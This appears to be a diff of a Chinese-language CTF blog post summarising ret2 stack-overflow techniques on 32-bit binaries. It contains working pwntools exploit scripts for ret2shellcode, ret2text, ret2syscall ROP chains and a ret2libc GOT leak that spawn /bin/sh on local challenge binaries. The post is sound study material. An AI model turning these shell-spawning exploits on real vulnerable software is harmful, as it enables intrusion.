@@ -536,7 +536,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-06-27 22:31:47" itemprop="dateModified" datetime="2025-06-27T22:31:47+08:00">2025-06-27</time>
+      <time title="修改时间：2025-11-12 22:56:55" itemprop="dateModified" datetime="2025-11-12T22:56:55+08:00">2025-11-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -555,14 +555,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>4.3k</span>
+      <span>5.8k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>8 分钟</span>
+      <span>11 分钟</span>
     </span>
 </div>
 
@@ -578,22 +578,39 @@
 <li>修改返回地址，让其指向溢出数据中的一段指令（<strong>shellcode</strong>）</li>
 <li>修改返回地址，让其指向内存中已有的某个函数（<strong>ret2text</strong>）</li>
 <li>修改返回地址，让其指向内存中已有的数段指令（<strong>ret2syscall</strong>）</li>
-<li><strong>有system无&#x3D;有&#x2F;bin&#x2F;sh</strong>，直接传入system地址和参数地址（<strong>ret2libc1</strong>）</li>
+<li><strong>有system有&#x2F;bin&#x2F;sh</strong>，直接传入system地址和参数地址（<strong>ret2libc1</strong>）</li>
 <li><strong>有system无&#x2F;bin&#x2F;sh</strong>，修改返回地址，传入bin_sh并执行system（<strong>ret2libc2</strong>）</li>
 <li><strong>无system无&#x2F;bin&#x2F;sh</strong>，修改返回地址，让其执行libc中的函数（<strong>ret2libc3</strong>）</li>
 </ul>
 <h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>buf2变量地址在bss段中，但是他的具体执行内容是存储在栈段中的，这里bss段可执行，所以我们能写入buf2所在的bss段中，能够执行shellcode</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;/home/pie/pwn-challenge/./ret2shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">payload+=p32(buf2)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">buf=<span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload=shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>) + p32(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p>这题很特殊，IDA中给的是变量地址与ebp的长度是错的</p>
+<img src="/2025/06/25/Several%20ret2%20Attack%20Principles/_Typora\笔记\CTF\PWN\例题\ret2的几种攻击原理总结\image-20251112170255715.png" alt="image-20251112170255715" style="zoom: 80%;">
 
-
+<p>同时这题告诉我们，变量不一定位于栈顶，这里的变量应该是地址0xffffd34c，所以我们计算偏移应该从此处开始</p>
+<p>偏移为108+4&#x3D;112</p>
 <h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>有后门函数的情况，将返回地址改为后门函数所在地址，直接ret执行后门函数</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x6c</span> + <span class="number">4</span>) + p32(target))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>通过Ropgadget找到gadget片段，然后构造系统调用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binsh=<span class="number">0x080be408</span></span><br><span class="line">int_80=<span class="number">0x08049421</span></span><br><span class="line">pop_eax_ret=<span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret=<span class="number">0x0806eb90</span></span><br><span class="line"></span><br><span class="line">payload=flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,binsh,int_80])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;/home/pie/pwn-challenge/./ret2syscall&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>操作系统不允许程序员直接对操作系统进行操作编程，要通过系统调用：</p>
+<ul>
+<li>操作系统提供给用户的编程接口</li>
+<li>是提供访问操作系统所管理的底层硬件的接口</li>
+<li>本质上是一些内核函数代码，以规范的方式驱动硬件</li>
+<li>x86 通过 int 0x80 指令进行系统调用、amd64 通过 syscall 指令进行系统调用</li>
+</ul>
+<p>实现系统调用，拿到控制权限，就是要构造下面这一个原本不存在的代码，将寄存器中的值变为指定内容，最后调用<code>int 0x80</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0xb</span><br><span class="line">mov ebx, [“/bin/sh”] </span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">int 0x80</span><br><span class="line">=&gt; execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/06/25/Several%20ret2%20Attack%20Principles/_Typora\笔记\CTF\PWN\例题\ret2的几种攻击原理总结\image-20250522173550007.png" alt="image-20250522173550007" style="zoom:50%;">
+
+<p>要找到这几条指定命令，并且将寄存器中值变为指定值</p>
+<p><code>int 0x80</code>是一个表示系统调用的指令<code>int 0x80 (eax=0xb, ebx=&quot;/bin/sh&quot;, ecx=0, edx=0)</code>，其中eax&#x3D;0xb表示的就说一个系统调用函数<code>sys_execue</code>的过程</p>
+<p>通过Ropgadget找到gadget片段，然后构造系统调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret=<span class="number">0x080bb196</span></span><br><span class="line"></span><br><span class="line">pop_edx_ecx_ebx_ret=<span class="number">0x0806eb90</span></span><br><span class="line">int80=<span class="number">0x08049421</span></span><br><span class="line">binsh=<span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload=flat([cyclic(<span class="number">112</span>),pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,binsh,int80])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
@@ -675,9 +692,47 @@
 <p>会将我们第一个传入的参数buf作为一个地址，并将这个地址的内容打印出来 -&gt; 也就是我们能通过传入一个地址获取该地址的内容</p>
 <p>传入<code>puts_got</code>即能够获得puts的真实地址，再通过<code>libc.sym[&quot;puts&quot;]</code>获取到<code>puts</code>函数在libc中的偏移，<strong>基址&#x3D;真实地址-偏移</strong></p>
 <h4 id="关键点2：找到pwn攻击点"><a href="#关键点2：找到pwn攻击点" class="headerlink" title="关键点2：找到pwn攻击点"></a>关键点2：找到pwn攻击点</h4><p>攻击点在<code>Print_message(src);</code>函数中，利用其中的strcpy进行栈溢出攻击，而前面的<code>See_something</code>和其他一些read则用来获得关键点1中的数据</p>
-<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&quot; : &quot;</span>)</span><br><span class="line">libcBase=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcBase -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libcBase))</span><br><span class="line"></span><br><span class="line">payload=flat([cyclic(<span class="number">60</span>),libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>],<span class="number">0xdeadbeef</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>))])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;ret2libc3/ret2libc3&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;ret2libc3/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#step one，find libcbase</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Give me an address (in dec) :&quot;</span>)</span><br><span class="line">printf_plt=elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"><span class="comment">#recv then send</span></span><br><span class="line">payload1=<span class="built_in">str</span>(printf_plt).encode()</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#find libcbase</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;The content of the address : &quot;</span>)</span><br><span class="line"></span><br><span class="line">libcbase=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system=libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) + libcbase</span><br><span class="line"></span><br><span class="line"><span class="comment">#getsh</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Leave some message for me :&quot;</span>)</span><br><span class="line">payload2=flat([cyclic(<span class="number">56</span>+<span class="number">4</span>),system,<span class="number">0xdeedbeef</span>,bin_sh])</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>其中libc已经和视频课中给出的不同了，我们要用ldd指令进行查看，查看之后将查看出的路径填入libc</p>
+<p>接受函数处还有一点需要我们注意：</p>
+<p><code>recv()</code> 函数的核心作用是<strong>接收字节（<code>bytes</code> 类型）</strong>，而非字符串（<code>str</code> 类型）</p>
+<p>这里通过我们debug调试可以知道需要接受的是</p>
+<p><img src="/2025/06/25/Several%20ret2%20Attack%20Principles/笔记\CTF\PWN\例题\ret2的几种攻击原理总结\image-20251112224901447.png" alt="image-20251112224901447"></p>
+<p>而这里字节流b<code>0xf7d8adb0</code>实际上是10个字节，字节流中，一个字符为一个字节，b<code>\xf7</code>，这个才算是一个字节</p>
+<hr>
+<p>这里就算用<code>recv(10)</code>，结果也是报错，原因如下：</p>
+<p><strong>1. <code>u32</code>函数的硬性要求</strong></p>
+<p><code>u32</code>函数的设计目的是<strong>解析 4 字节的二进制数据</strong>（例如内存中存储的原始地址，如<code>b&#39;\xb0\x4d\xce\xf7&#39;</code>），它强制要求输入的<code>bytes</code>长度必须是 4 字节（不足会补 0，超过会截断，但本质上只处理 4 字节）。</p>
+<p>而你用<code>recv(10)</code>接收的是<strong>字符串形式的地址</strong>（如<code>b&#39;0xf7ce4db0&#39;</code>），这是 10 字节的<code>bytes</code>（包含<code>0x</code>和 8 位十六进制字符），显然不符合<code>u32</code>对 “4 字节二进制数据” 的要求，因此直接报错<code>unpack requires a buffer of 4 bytes</code>。</p>
+<p><strong>2. 两种地址形式的本质区别</strong></p>
+<p>程序输出的地址有两种完全不同的形式，处理方式也完全不同：</p>
+<table>
+<thead>
+<tr>
+<th>形式</th>
+<th>示例数据</th>
+<th>长度</th>
+<th>处理方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>字符串形式的地址</td>
+<td><code>b&#39;0xf7ce4db0&#39;</code></td>
+<td>10 字节</td>
+<td>用<code>int(addr_str, 16)</code>转为整数</td>
+</tr>
+<tr>
+<td>二进制形式的地址</td>
+<td><code>b&#39;\xb0\x4d\xce\xf7&#39;</code></td>
+<td>4 字节</td>
+<td>用<code>u32(addr_bytes)</code>转为整数</td>
+</tr>
+</tbody></table>
+<hr>
+<p>这种还是用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcbase=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>最好</p>
 
       
     </div>
